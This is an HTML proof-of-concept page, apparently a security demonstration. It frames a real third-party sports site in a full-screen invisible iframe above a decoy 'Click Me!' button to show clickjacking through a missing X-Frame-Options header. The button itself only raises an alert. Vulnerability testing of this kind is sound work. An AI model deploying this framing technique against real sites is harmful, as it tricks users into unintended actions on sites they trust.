<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clickjacking Test</title>
  <style>
    /* Make the iframe invisible */
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      z-index: 2;
    }
    /* Overlay a fake button */
    .fake-button {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1;
      background-color: red;
      color: white;
      padding: 10px 20px;
      font-size: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Welcome to Test Page</h1>
  <p>This page demonstrates a clickjacking attack due to missing X-Frame-Options header.</p>

  <!-- Embed the victim's website in an invisible iframe -->
  <iframe src="https:// fans.sports.qq.com/"></iframe>

  <!-- Overlay a fake button -->
  <div class="fake-button" onclick="alert('tricked!  test!')">
    Click Me!
  </div>
</body>
</html>
